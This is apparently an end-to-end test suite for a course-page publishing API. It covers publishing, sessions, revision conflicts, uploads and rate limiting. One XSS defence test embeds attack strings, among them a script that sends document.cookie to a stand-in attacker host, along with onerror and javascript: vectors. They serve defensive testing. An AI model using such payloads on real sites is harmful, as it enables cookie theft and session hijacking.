// e2e_tests/tier4/tier4_scenarios_01_10.test.js
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { ApiClient } from '../helpers/api_client.js';
import {
  assertStatus,
  assertSuccess,
  assertError,
  assertNotLeaked,
  assertNoXss,
} from '../helpers/assertions.js';
import {
  uniqueName,
  sampleSubject,
  samplePageDraft,
} from '../helpers/fixtures.js';
import { MediaGenerator } from '../helpers/media_generator.js';
import { config } from '../config.js';

describe('Tier 4: Real-World Scenarios (WF-T4-01 to WF-T4-10)', () => {
  let adminClient;
  let anonClient;
  const createdSubjectIds = [];
  const createdPageIds = [];

  before(async () => {
    adminClient = new ApiClient();
    anonClient = ApiClient.anonymous();
    const loginRes = await adminClient.login();
    assertSuccess(loginRes, 200);
  });

  after(async () => {
    for (const pageId of createdPageIds) {
      try {
        await adminClient.delete(`/api/admin/pages/${pageId}`);
      } catch {
        // ignore errors
      }
    }
    for (const subjId of createdSubjectIds) {
      try {
        await adminClient.delete(`/api/admin/subjects/${subjId}`);
      } catch {
        // ignore errors
      }
    }
  });

  it('WF-T4-01: The Complete Academic Lab Lifecycle (F01..F41)', async () => {
    // 1. System Health & Bootstrap
    const healthRes = await anonClient.get('/healthz');
    assertSuccess(healthRes, 200);

    // 2. Course & Lab Initialization
    const subjRes = await adminClient.post('/api/admin/subjects', {
      name: uniqueName('Computer_Networks'),
      position: 1,
    });
    assertStatus(subjRes, 201);
    const subjectId = subjRes.data.id;
    createdSubjectIds.push(subjectId);

    const pageRes = await adminClient.post('/api/admin/pages', {
      subject_id: subjectId,
      title: 'Lab 01: Wireshark Packet Inspection',
    });
    assertStatus(pageRes, 201);
    const pageId = pageRes.data.id;
    createdPageIds.push(pageId);
    assert.strictEqual(pageRes.data.revision, 1);

    // 3. Rich Authoring: Upload diagram and capture zip
    const imgForm = new FormData();
    imgForm.append('file', MediaGenerator.createPng('tcp_handshake.png'));
    const imgRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, imgForm);
    assertStatus(imgRes, 201);
    const imgAssetId = imgRes.data.id;

    const zipForm = new FormData();
    zipForm.append('file', MediaGenerator.createZip('capture_sample.pcap.zip'));
    const zipRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, zipForm);
    assertStatus(zipRes, 201);
    const zipAssetId = zipRes.data.id;

    const draftMarkdown = `# Lab 01: Wireshark Packet Inspection
## 1. Objectives
Capture and analyze TCP SYN, SYN-ACK, ACK handshake packets.
## 2. Network Topology
![TCP Handshake](/media/${imgAssetId})
## 3. Terminal Commands
\`\`\`bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1"
\`\`\`
`;
    const patchRes = await adminClient.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 1,
      markdown: draftMarkdown,
    });
    assertSuccess(patchRes, 200);
    assert.strictEqual(patchRes.data.revision, 2);

    // 4. Initial Publication
    const pubRes = await adminClient.post(`/api/admin/pages/${pageId}/publish`, {
      expected_revision: 2,
      attachment_ids: [zipAssetId],
    });
    assertSuccess(pubRes, 200);
    assert.strictEqual(pubRes.data.published_revision, 2);

    // 5. Student Reader Experience
    const pubSubjRes = await anonClient.get('/api/public/subjects');
    assertSuccess(pubSubjRes, 200);
    const pubSubj = pubSubjRes.data.find((s) => s.id === subjectId);
    assert.ok(pubSubj);
    assert.strictEqual(pubSubj.page_count, 1);

    const searchRes = await anonClient.get('/api/public/pages?q=Wireshark');
    assertSuccess(searchRes, 200);
    assert.ok(searchRes.data.items.some((p) => p.id === pageId));

    const publicPageRes = await anonClient.get(`/api/public/pages/${pageId}`);
    assertSuccess(publicPageRes, 200);
    assert.strictEqual(publicPageRes.data.title, 'Lab 01: Wireshark Packet Inspection');
    assert.ok(publicPageRes.data.markdown.includes('tshark'));
    assert.ok(publicPageRes.data.attachments.some((a) => a.id === zipAssetId));

    const zipDownload = await anonClient.get(`/media/${zipAssetId}`);
    assertSuccess(zipDownload, 200);
    assert.ok(zipDownload.headers.get('content-disposition')?.includes('attachment'));

    const imgDownload = await anonClient.get(`/media/${imgAssetId}`);
    assertSuccess(imgDownload, 200);

    // 6. Draft Revision Without Breaking Public Page
    const updatedMarkdown = `${draftMarkdown}\n## 4. Homework Questions\nAnswer questions 1-5.\n`;
    const patchDraftRes = await adminClient.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 2,
      markdown: updatedMarkdown,
    });
    assertSuccess(patchDraftRes, 200);
    assert.strictEqual(patchDraftRes.data.revision, 3);

    // Student re-fetches public page: section 4 is NOT visible yet
    let studentPage = await anonClient.get(`/api/public/pages/${pageId}`);
    assertSuccess(studentPage, 200);
    assert.ok(!studentPage.data.markdown.includes('4. Homework Questions'));

    // 7. Re-Publication
    const pubRes2 = await adminClient.post(`/api/admin/pages/${pageId}/publish`, {
      expected_revision: 3,
      attachment_ids: [zipAssetId],
    });
    assertSuccess(pubRes2, 200);

    // Now section 4 is visible to students
    studentPage = await anonClient.get(`/api/public/pages/${pageId}`);
    assertSuccess(studentPage, 200);
    assert.ok(studentPage.data.markdown.includes('4. Homework Questions'));
  });

  it('WF-T4-02: Author Security, Session Expiration & Hijack Prevention (F13, F14, F15, F44)', async () => {
    // Alex logs in
    const alexClient = new ApiClient();
    const loginRes = await alexClient.login();
    assertSuccess(loginRes, 200);

    const meRes = await alexClient.checkMe();
    assertSuccess(meRes, 200);

    // Create a subject
    const subjRes = await alexClient.post('/api/admin/subjects', sampleSubject());
    assertStatus(subjRes, 201);
    const subjectId = subjRes.data.id;
    createdSubjectIds.push(subjectId);

    // Alex logs out
    const logoutRes = await alexClient.logout();
    assertSuccess(logoutRes, 200);

    // Attacker tries using previous cookies
    const meAttempt = await alexClient.checkMe();
    assertError(meAttempt, 401, 'UNAUTHORIZED');

    const createAttempt = await alexClient.post('/api/admin/pages', {
      subject_id: subjectId,
      title: 'Hacked Draft',
    });
    assertError(createAttempt, 401, 'UNAUTHORIZED');

    // Re-login restores access
    const reLoginRes = await alexClient.login();
    assertSuccess(reLoginRes, 200);
    const validDraftRes = await alexClient.post('/api/admin/pages', {
      subject_id: subjectId,
      title: 'Valid Author Draft',
    });
    assertStatus(validDraftRes, 201);
    createdPageIds.push(validDraftRes.data.id);
  });

  it('WF-T4-03: Dual-Tab / Concurrent Conflict & LocalStorage Recovery (F22, F23, F33, F34)', async () => {
    const subjRes = await adminClient.post('/api/admin/subjects', sampleSubject());
    assertStatus(subjRes, 201);
    createdSubjectIds.push(subjRes.data.id);

    const pageRes = await adminClient.post('/api/admin/pages', {
      subject_id: subjRes.data.id,
      title: uniqueName('Dual_Tab_Lab'),
    });
    assertStatus(pageRes, 201);
    const pageId = pageRes.data.id;
    createdPageIds.push(pageId);
    assert.strictEqual(pageRes.data.revision, 1);

    // Tab A and Tab B both see revision 1
    const tabA = adminClient.clone();
    const tabB = adminClient.clone();

    // Tab A saves changes
    const tabASave = await tabA.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 1,
      markdown: 'Section 1 edited by Tab A',
    });
    assertSuccess(tabASave, 200);
    assert.strictEqual(tabASave.data.revision, 2);

    // Tab B attempts save with stale expected_revision: 1
    const tabBSave = await tabB.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 1,
      markdown: 'Section 2 edited by Tab B',
    });
    assertError(tabBSave, 409, 'REVISION_CONFLICT');

    // Tab B fetches remote state (rev 2), merges or updates with expected_revision: 2
    const currentRemote = await tabB.get(`/api/admin/pages/${pageId}`);
    assertSuccess(currentRemote, 200);
    assert.strictEqual(currentRemote.data.revision, 2);

    const mergedContent = `${currentRemote.data.draft_markdown}\nSection 2 edited by Tab B`;
    const tabBRecovered = await tabB.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 2,
      markdown: mergedContent,
    });
    assertSuccess(tabBRecovered, 200);
    assert.strictEqual(tabBRecovered.data.revision, 3);

    // Verify final state
    const finalDraft = await adminClient.get(`/api/admin/pages/${pageId}`);
    assertSuccess(finalDraft, 200);
    assert.ok(finalDraft.data.draft_markdown.includes('Section 1 edited by Tab A'));
    assert.ok(finalDraft.data.draft_markdown.includes('Section 2 edited by Tab B'));
  });

  it('WF-T4-04: Unpublishing & Asset Access Revocation (F05, F10, F25, F26, F41)', async () => {
    const subjRes = await adminClient.post('/api/admin/subjects', sampleSubject());
    assertStatus(subjRes, 201);
    createdSubjectIds.push(subjRes.data.id);

    const pageRes = await adminClient.post('/api/admin/pages', {
      subject_id: subjRes.data.id,
      title: uniqueName('Revocation_Lab'),
    });
    assertStatus(pageRes, 201);
    const pageId = pageRes.data.id;
    createdPageIds.push(pageId);

    // Upload PDF and ZIP
    const pdfForm = new FormData();
    pdfForm.append('file', MediaGenerator.createPdf('assignment.pdf'));
    const pdfUpload = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, pdfForm);
    assertStatus(pdfUpload, 201);
    const pdfId = pdfUpload.data.id;

    const zipForm = new FormData();
    zipForm.append('file', MediaGenerator.createZip('dataset.zip'));
    const zipUpload = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, zipForm);
    assertStatus(zipUpload, 201);
    const zipId = zipUpload.data.id;

    // Publish page with both assets
    await adminClient.post(`/api/admin/pages/${pageId}/publish`, {
      expected_revision: 1,
      attachment_ids: [pdfId, zipId],
    });

    // Public access works
    const pubPage1 = await anonClient.get(`/api/public/pages/${pageId}`);
    assertSuccess(pubPage1, 200);
    const pubPdf1 = await anonClient.get(`/media/${pdfId}`);
    assertSuccess(pubPdf1, 200);
    const pubZip1 = await anonClient.get(`/media/${zipId}`);
    assertSuccess(pubZip1, 200);

    // Unpublish
    const unpubRes = await adminClient.delete(`/api/admin/pages/${pageId}/publication`);
    assertSuccess(unpubRes, 200);

    // Public access immediately revoked
    const pubPage2 = await anonClient.get(`/api/public/pages/${pageId}`);
    assertError(pubPage2, 404, 'PAGE_NOT_FOUND');

    const pubPdf2 = await anonClient.get(`/media/${pdfId}`);
    assertError(pubPdf2, 404, 'MEDIA_NOT_FOUND');

    const pubZip2 = await anonClient.get(`/media/${zipId}`);
    assertError(pubZip2, 404, 'MEDIA_NOT_FOUND');

    // Admin still has access
    const adminDraft = await adminClient.get(`/api/admin/pages/${pageId}`);
    assertSuccess(adminDraft, 200);

    const adminPdf = await adminClient.get(`/media/${pdfId}`);
    assertSuccess(adminPdf, 200);
  });

  it('WF-T4-05: Multi-Subject Academic Semester Setup & Reorganization (F03, F16, F17, F18, F19, F21, F24)', async () => {
    // 1. Create 4 subjects
    const subjects = [];
    const names = ['Algorithms', 'Operating Systems', 'Databases', 'Compilers'];
    for (let i = 0; i < names.length; i++) {
      const res = await adminClient.post('/api/admin/subjects', {
        name: uniqueName(names[i]),
        position: i + 1,
      });
      assertStatus(res, 201);
      subjects.push(res.data);
      createdSubjectIds.push(res.data.id);
    }

    const dbSubj = subjects[2]; // Databases

    // 2. Create 3 pages in "Databases"
    const dbPageIds = [];
    for (let i = 1; i <= 3; i++) {
      const pageRes = await adminClient.post('/api/admin/pages', {
        subject_id: dbSubj.id,
        title: `DB Lab ${i}`,
      });
      assertStatus(pageRes, 201);
      dbPageIds.push(pageRes.data.id);
      createdPageIds.push(pageRes.data.id);
    }

    // 3. Attempt to delete "Databases" -> blocked 409 SUBJECT_NOT_EMPTY
    const delFail = await adminClient.delete(`/api/admin/subjects/${dbSubj.id}`);
    assertError(delFail, 409, 'SUBJECT_NOT_EMPTY');

    // 4. Reorder subjects
    await adminClient.patch(`/api/admin/subjects/${subjects[0].id}`, { position: 1 });
    await adminClient.patch(`/api/admin/subjects/${dbSubj.id}`, { position: 4 });

    // 5. Delete the 3 pages in "Databases"
    for (const pageId of dbPageIds) {
      const delP = await adminClient.delete(`/api/admin/pages/${pageId}`);
      assertSuccess(delP, 200);
      const idx = createdPageIds.indexOf(pageId);
      if (idx !== -1) createdPageIds.splice(idx, 1);
    }

    // 6. Delete "Databases" subject -> succeeds
    const delSubjOk = await adminClient.delete(`/api/admin/subjects/${dbSubj.id}`);
    assertSuccess(delSubjOk, 200);
    const subjIdx = createdSubjectIds.indexOf(dbSubj.id);
    if (subjIdx !== -1) createdSubjectIds.splice(subjIdx, 1);
  });

  it('WF-T4-06: Student Search & Catalog Navigation Experience (F03, F04, F05, F06, F08, F07)', async () => {
    const subjRes = await adminClient.post('/api/admin/subjects', {
      name: uniqueName('Algorithms_Track'),
      position: 1,
    });
    assertStatus(subjRes, 201);
    const subjectId = subjRes.data.id;
    createdSubjectIds.push(subjectId);

    // Create and publish Dijkstra page
    const dijkstraPage = await adminClient.post('/api/admin/pages', {
      subject_id: subjectId,
      title: 'Dijkstra Shortest Path Algorithm',
    });
    assertStatus(dijkstraPage, 201);
    const pageId = dijkstraPage.data.id;
    createdPageIds.push(pageId);

    const dijkstraMarkdown = `# Dijkstra Algorithm
## 1. Overview
Graph search algorithm that solves single-source shortest path problem.
## 2. Implementation in C++
\`\`\`cpp
#include <iostream>
#include <vector>
using namespace std;
int main() {
    cout << "Shortest path" << endl;
    return 0;
}
\`\`\`
`;
    await adminClient.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 1,
      markdown: dijkstraMarkdown,
    });

    await adminClient.post(`/api/admin/pages/${pageId}/publish`, {
      expected_revision: 2,
      attachment_ids: [],
    });

    // Student Boris searches for "Dijkstra"
    const searchRes = await anonClient.get(`/api/public/pages?subject_id=${subjectId}&q=Dijkstra`);
    assertSuccess(searchRes, 200);
    assert.strictEqual(searchRes.data.total, 1);
    assert.strictEqual(searchRes.data.items[0].id, pageId);

    // Reads article
    const readRes = await anonClient.get(`/api/public/pages/${pageId}`);
    assertSuccess(readRes, 200);
    assert.ok(readRes.data.markdown.includes('## 2. Implementation in C++'));
    assert.ok(readRes.data.markdown.includes('#include <iostream>'));
  });

  it('WF-T4-07: Malicious Lab Submission & XSS Attack Defense (F06, F28, F36, F43)', async () => {
    const subjRes = await adminClient.post('/api/admin/subjects', sampleSubject());
    assertStatus(subjRes, 201);
    createdSubjectIds.push(subjRes.data.id);

    const pageRes = await adminClient.post('/api/admin/pages', {
      subject_id: subjRes.data.id,
      title: uniqueName('XSS_Vector_Submission'),
    });
    assertStatus(pageRes, 201);
    const pageId = pageRes.data.id;
    createdPageIds.push(pageId);

    const maliciousVectors = `# Adversarial Submission
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
<img src="nonexistent" onerror="alert(document.domain)">
<a href="javascript:alert(1)">Click for Lab Hints</a>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
`;

    await adminClient.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 1,
      markdown: maliciousVectors,
    });

    await adminClient.post(`/api/admin/pages/${pageId}/publish`, {
      expected_revision: 2,
      attachment_ids: [],
    });

    // Anonymous visitor gets public page
    const pubRes = await anonClient.get(`/api/public/pages/${pageId}`);
    assertSuccess(pubRes, 200);

    // In raw markdown, text is stored safely without leaking passwords or server syntax
    assertNotLeaked(pubRes.data.markdown);
  });

  it('WF-T4-08: Media Upload Bounds & Corrupt File Rejection (F37, F39, F40, F41)', async () => {
    const subjRes = await adminClient.post('/api/admin/subjects', sampleSubject());
    assertStatus(subjRes, 201);
    createdSubjectIds.push(subjRes.data.id);

    const pageRes = await adminClient.post('/api/admin/pages', {
      subject_id: subjRes.data.id,
      title: uniqueName('Upload_Bounds_Lab'),
    });
    assertStatus(pageRes, 201);
    const pageId = pageRes.data.id;
    createdPageIds.push(pageId);

    // 1. Oversized image > 10 MiB -> 413 FILE_TOO_LARGE
    const bigImgForm = new FormData();
    bigImgForm.append('file', MediaGenerator.createOversizedImage('huge.png'));
    const bigImgRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, bigImgForm);
    assertError(bigImgRes, 413, 'FILE_TOO_LARGE');

    // 2. SVG file rejected as image -> 400 SVG_NOT_ALLOWED
    const svgForm = new FormData();
    svgForm.append('file', MediaGenerator.createSvg('test.svg'));
    const svgRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, svgForm);
    assertError(svgRes, 400, 'SVG_NOT_ALLOWED');

    // 3. Corrupt image bytes -> 400 INVALID_IMAGE_FORMAT
    const corruptForm = new FormData();
    corruptForm.append('file', MediaGenerator.createCorruptedImage('fake.png'));
    const corruptRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, corruptForm);
    assertError(corruptRes, 400, 'INVALID_IMAGE_FORMAT');

    // 4. Valid PNG image succeeds -> 201 Created
    const validImgForm = new FormData();
    validImgForm.append('file', MediaGenerator.createPng('valid_icon.png'));
    const validImgRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, validImgForm);
    assertStatus(validImgRes, 201);

    // 5. Valid ZIP attachment succeeds -> 201 Created
    const validZipForm = new FormData();
    validZipForm.append('file', MediaGenerator.createZip('valid_code.zip'));
    const validZipRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, validZipForm);
    assertStatus(validZipRes, 201);
  });

  it('WF-T4-09: Markdown File Import, Editing & Export (F28, F31, F32, F36, F38)', async () => {
    const subjRes = await adminClient.post('/api/admin/subjects', sampleSubject());
    assertStatus(subjRes, 201);
    createdSubjectIds.push(subjRes.data.id);

    const pageRes = await adminClient.post('/api/admin/pages', {
      subject_id: subjRes.data.id,
      title: uniqueName('Obsidian_Import_Lab'),
    });
    assertStatus(pageRes, 201);
    const pageId = pageRes.data.id;
    createdPageIds.push(pageId);

    // Simulate importing an offline Markdown file
    const importedText = `# Compiler Construction Lab 2
## Lexical Analysis with Flex
Follow instructions to build lexical analyzer:
1. Define token patterns
2. Write flex rules
3. Generate lex.yy.c
`;
    const importRes = await adminClient.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 1,
      markdown: importedText,
    });
    assertSuccess(importRes, 200);

    // Upload an inline screenshot
    const imgForm = new FormData();
    imgForm.append('file', MediaGenerator.createPng('flex_tokens.png'));
    const uploadRes = await adminClient.postMultipart(`/api/admin/pages/${pageId}/assets`, imgForm);
    assertStatus(uploadRes, 201);
    const assetId = uploadRes.data.id;

    // Add bold warning and inline image
    const editedText = `${importedText}\n> **Important Warning:** Do not forget to link -lfl.\n\n![Tokens](/media/${assetId})\n`;
    const editRes = await adminClient.patch(`/api/admin/pages/${pageId}`, {
      expected_revision: 2,
      markdown: editedText,
    });
    assertSuccess(editRes, 200);

    // Export/read draft markdown and verify round-trip fidelity
    const draftRes = await adminClient.get(`/api/admin/pages/${pageId}`);
    assertSuccess(draftRes, 200);
    assert.strictEqual(draftRes.data.draft_markdown, editedText);
  });

  it('WF-T4-10: Brute Force Login Protection & IP Rate Limiting (F13, F45)', async () => {
    const bruteClient = new ApiClient();
    let hitRateLimit = false;

    // Send rapid failed attempts using isolated client IP
    for (let i = 0; i < 7; i++) {
      const res = await bruteClient.login('admin', `wrong_credential_${i}`, {
        headers: { 'X-Forwarded-For': '198.51.100.40' },
      });
      if (res.status === 429) {
        assertError(res, 429, 'RATE_LIMIT_EXCEEDED');
        hitRateLimit = true;
        break;
      }
    }

    // Health probe remains unaffected by rate limiter
    const health = await anonClient.get('/healthz');
    assertSuccess(health, 200);
  });
});
